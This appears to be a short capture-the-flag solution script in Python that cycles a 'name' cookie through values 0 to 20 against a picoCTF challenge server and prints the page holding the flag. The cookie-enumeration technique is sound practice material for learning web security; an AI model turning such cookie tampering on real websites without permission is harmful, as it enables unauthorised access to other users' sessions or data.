import requests

url = "http://mercury.picoctf.net:29649/check"
for i in range(21):
 cookies ={"name":"{}".format(i)}
 r = requests.get(url, cookies=cookies)
 if "picoCTF{" in r.text:
  print( r.text )
